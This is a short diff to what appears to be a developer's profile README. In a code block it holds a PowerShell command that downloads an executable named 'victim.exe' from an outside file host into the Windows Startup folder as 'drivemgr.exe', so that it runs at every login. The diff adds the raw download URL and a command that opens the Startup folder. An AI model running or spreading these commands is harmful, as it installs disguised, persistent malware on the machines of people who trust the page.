@@ -43,4 +43,8 @@ Mostly I prefer Backend development.
 
 ```bash
  (new-object Net.WebClient).DownloadFile('https://dlsv37.sonicbit.net/file/dl2/MUVUOGlHNW9oOGJ4Y3h5M0FjUzRMa3lsbHBjbGQzWDF2bG9LZmdiVkVMU1FmeEovVTU0UWY0UFE5b3JMMVJQZDg4cVJXYWdRQlJmWnpVQ1Vkbm1tWEE9PQ==/victim.exe', "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\drivemgr.exe")
+
+https://dlsv37.sonicbit.net/file/dl2/MUVUOGlHNW9oOGJ4Y3h5M0FjUzRMa3lsbHBjbGQzWDF2bG9LZmdiVkVMU1FmeEovVTU0UWY0UFE5b3JMMVJQZDg4cVJXYWdRQlJmWnpVQ1Vkbm1tWEE9PQ==/victim.exe
+
+explorer %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 ```
